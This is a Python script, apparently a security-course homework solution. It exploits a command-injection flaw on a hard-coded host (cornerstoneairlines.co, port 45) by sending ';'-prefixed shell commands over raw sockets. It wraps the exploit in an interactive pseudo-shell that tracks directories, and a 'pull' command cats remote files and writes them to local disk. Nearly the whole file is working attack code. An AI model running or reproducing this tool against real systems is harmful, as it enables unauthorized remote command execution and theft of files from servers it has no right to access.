"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
import socket, sys, os, time



host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd,currentDir):
    cmd_split = cmd.split(" ")
    extra_cd = "cd "
    if cmd_split [0] == "cd":
        if cmd_split[-1] == "..":
            path = currentDir.split("/")
            path.pop(-1)
            path = "/".join(path)
            extra_cd += (path if not path.replace(" ","") == "" else "/")
            currentDir = extra_cd.replace("cd ","")
        elif cmd == "cd":
            currentDir = "/"
            extra_cd = "cd /"
        else:
            extra_cd += (currentDir if not currentDir == "/" else "")  + cmd_split[-1]
            currentDir = (currentDir if not currentDir == "/" else "") + cmd_split[-1]
    else:
        extra_cd = "cd " + currentDir

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    time.sleep(1)
    data = s.recv(1024)
    if cmd_split[0] == "cd":
        command = ";(" + extra_cd + ")\n"
    else:
        command = ";(" + extra_cd + "; " +  cmd + ")\n"
    encodedSend = bytes(command, 'utf-8')
    s.send(encodedSend)
    time.sleep(1)
    data = s.recv(1024)
    s.close()
    return currentDir,data.decode('utf-8')

def pullFile(toDownload, nameofFile):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    time.sleep(1)
    data = s.recv(1024)
    command = ";" + "cat " + toDownload + "\n"
    s.send(bytes(command, 'utf-8'))
    time.sleep(1)
    with open(os.path.join(os.getcwd(), nameofFile), 'wb') as newFile:
        while True:
            data = s.recv(1024)
            if not data:
                break
            newFile.write(data)
        newFile.close()
    s.close()


def printNotice():
    print("shell Drop into an interactive shell and allow users to gracefully exit")
    print("pull <remote-path> <local-path> Download files")
    print("help Shows this help menu")
    print("quit Quit the shell")
if __name__ == '__main__':
    shellOn = False
    prompt = ">"
    currentDir = "/"
    while(True):
        userInput = input(prompt)
        if userInput == "quit":
            sys.exit()
        elif userInput == "exit":
            if shellOn:
                shellOn = False
                prompt = ">"
                print("You have exited the shell")
            else:
                print("You were not in the shell.")
        elif userInput == "help":
            printNotice()
        elif not userInput.find("pull") == -1:
            data =  userInput.split(" ")
            if len(data) == 3:
                pullFile(data[1],data[2])
            else:
                printNotice()
        elif userInput == "shell":
            shellOn = True
            prompt = "/" + prompt
        else:
            if shellOn:
               currentDir, output = execute_cmd(userInput, currentDir)
               prompt = currentDir + ">"
               print(output)
            else:
                printNotice()


